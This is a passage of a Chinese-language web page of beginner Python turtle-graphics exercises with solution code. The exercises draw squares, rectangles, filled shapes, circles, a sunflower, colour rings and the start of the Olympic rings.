punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-绘制如图所示10个边长为100的正方形"><a href="#2-绘制如图所示10个边长为100的正方形" class="headerlink" title="2.绘制如图所示10个边长为100的正方形"></a>2.绘制如图所示10个边长为100的正方形</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span>width<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>            t<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-正方形：边长100，线条粗5，绿色"><a href="#3-正方形：边长100，线条粗5，绿色" class="headerlink" title="3.正方形：边长100，线条粗5，绿色"></a>3.正方形：边长100，线条粗5，绿色</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"blue"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-长方形：长200宽100，红色，线条粗3，绘制速度10"><a href="#4-长方形：长200宽100，红色，线条粗3，绘制速度10" class="headerlink" title="4.长方形：长200宽100，红色，线条粗3，绘制速度10"></a>4.长方形：长200宽100，红色，线条粗3，绘制速度10</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"red"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-绘制如图所求图形，每个正方形的边长为50，线条粗细为5，颜色为红色，各个正文形间隔距离为10，最左侧正方形右下角的坐标为（0，0）"><a href="#5-绘制如图所求图形，每个正方形的边长为50，线条粗细为5，颜色为红色，各个正文形间隔距离为10，最左侧正方形右下角的坐标为（0，0）" class="headerlink" title="5.绘制如图所求图形，每个正方形的边长为50，线条粗细为5，颜色为红色，各个正文形间隔距离为10，最左侧正方形右下角的坐标为（0，0）"></a>5.绘制如图所求图形，每个正方形的边长为50，线条粗细为5，颜色为红色，各个正文形间隔距离为10，最左侧正方形右下角的坐标为（0，0）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token punctuation">.</span>up<span class="token punctuation">(</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>down<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>            t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-提升一：五个正方形的线条颜色依次显示为红色、绿色、蓝色、紫色、黄色。（red、green、blue、purple、yellow"><a href="#5-提升一：五个正方形的线条颜色依次显示为红色、绿色、蓝色、紫色、黄色。（red、green、blue、purple、yellow" class="headerlink" title="5+.提升一：五个正方形的线条颜色依次显示为红色、绿色、蓝色、紫色、黄色。（red、green、blue、purple、yellow)"></a>5+.提升一：五个正方形的线条颜色依次显示为红色、绿色、蓝色、紫色、黄色。（red、green、blue、purple、yellow)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">,</span><span class="token string">"purple"</span><span class="token punctuation">,</span><span class="token string">"yellow"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token punctuation">.</span>up<span class="token punctuation">(</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>down<span class="token punctuation">(</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span>lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>            t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-提升二：每个正方形的线条颜色随机产生，显示任意颜色"><a href="#5-提升二：每个正方形的线条颜色随机产生，显示任意颜色" class="headerlink" title="5++.提升二：每个正方形的线条颜色随机产生，显示任意颜色"></a>5++.提升二：每个正方形的线条颜色随机产生，显示任意颜色</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> t<span class="token keyword">import</span> randomt<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">,</span><span class="token string">"purple"</span><span class="token punctuation">,</span><span class="token string">"yellow"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token punctuation">.</span>up<span class="token punctuation">(</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>down<span class="token punctuation">(</span><span class="token punctuation">)</span>      t<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>            t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-填充色的长方形：长200宽100，红色，线条粗3，填充蓝色，绘制速度10"><a href="#6-填充色的长方形：长200宽100，红色，线条粗3，填充蓝色，绘制速度10" class="headerlink" title="6.填充色的长方形：长200宽100，红色，线条粗3，填充蓝色，绘制速度10"></a>6.填充色的长方形：长200宽100，红色，线条粗3，填充蓝色，绘制速度10</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pu<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pd<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'blue'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-绘制如下图形，长200宽100，线条蓝色，下方填充红色，上方填充绿色"><a href="#7-绘制如下图形，长200宽100，线条蓝色，下方填充红色，上方填充绿色" class="headerlink" title="7.绘制如下图形，长200宽100，线条蓝色，下方填充红色，上方填充绿色"></a>7.绘制如下图形，长200宽100，线条蓝色，下方填充红色，上方填充绿色</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pu<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pd<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'blue'</span><span class="token punctuation">,</span><span class="token string">'red'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'blue'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-绘制两个圆，圆的半径为100，窗体大小（600，600）"><a href="#8-绘制两个圆，圆的半径为100，窗体大小（600，600）" class="headerlink" title="8.绘制两个圆，圆的半径为100，窗体大小（600，600）"></a>8.绘制两个圆，圆的半径为100，窗体大小（600，600）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment">#画圆，半径为正(负)，表示圆心在画笔的左边(右边)画圆</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-将上述两个图形分别填充为红色和绿色两种颜色"><a href="#9-将上述两个图形分别填充为红色和绿色两种颜色" class="headerlink" title="9.将上述两个图形分别填充为红色和绿色两种颜色"></a>9.将上述两个图形分别填充为红色和绿色两种颜色</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"red"</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"green"</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-绘制一朵太阳花，红色花瓣由四个圆形图案组合而成，圆的半径为100，中间花心部分有一个半径为50的，黄色小圆构成"><a href="#10-绘制一朵太阳花，红色花瓣由四个圆形图案组合而成，圆的半径为100，中间花心部分有一个半径为50的，黄色小圆构成" class="headerlink" title="10.绘制一朵太阳花，红色花瓣由四个圆形图案组合而成，圆的半径为100，中间花心部分有一个半径为50的，黄色小圆构成"></a>10.绘制一朵太阳花，红色花瓣由四个圆形图案组合而成，圆的半径为100，中间花心部分有一个半径为50的，黄色小圆构成</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'red'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-绘制随机颜色圆环（不同心）"><a href="#11-绘制随机颜色圆环（不同心）" class="headerlink" title="11.绘制随机颜色圆环（不同心）"></a>11.绘制随机颜色圆环（不同心）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> t<span class="token keyword">import</span> randomt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>colormode<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    red <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    green <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    blue <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span>red<span class="token punctuation">,</span>green<span class="token punctuation">,</span>blue<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-11-绘制随机颜色圆环（同心）"><a href="#11-11-绘制随机颜色圆环（同心）" class="headerlink" title="11+.11.绘制随机颜色圆环（同心）"></a>11+.11.绘制随机颜色圆环（同心）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> t<span class="token keyword">import</span> randomt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>colormode<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token comment"># (0,0) (0,10) (0,20)</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    red <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    green <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    blue <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span>red<span class="token punctuation">,</span>green<span class="token punctuation">,</span>blue<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    y <span class="token operator">+=</span> <span class="token number">10</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="12-绘制十字架"><a href="#12-绘制十字架" class="headerlink" title="12.绘制十字架"></a>12.绘制十字架</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> t<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>rt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="13-绘制奥运五环图。要求：圆的半径为100，颜色分别为：蓝、黑、红、黄、绿。每个圆环交叉点在圆弧中间位置。【’blue’-’black’-’red’-’yellow’-’green’】"><a href="#13-绘制奥运五环图。要求：圆的半径为100，颜色分别为：蓝、黑、红、黄、绿。每个圆环交叉点在圆弧中间位置。【’blue’-’black’-’red’-’yellow’-’green’】" class="headerlink" title="13.绘制奥运五环图。要求：圆的半径为100，颜色分别为：蓝、黑、红、黄、绿。每个圆环交叉点在圆弧中间位置。【’blue’,’black’,’red’,’yellow’,’green’】"></a>13.绘制奥运五环图。要求：圆的半径为100，颜色分别为：蓝、黑、红、黄、绿。每个圆环交叉点在圆弧中间位置。【’blue’,’black’,’red’,’yellow’,’green’】</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">1000</span><span class="token 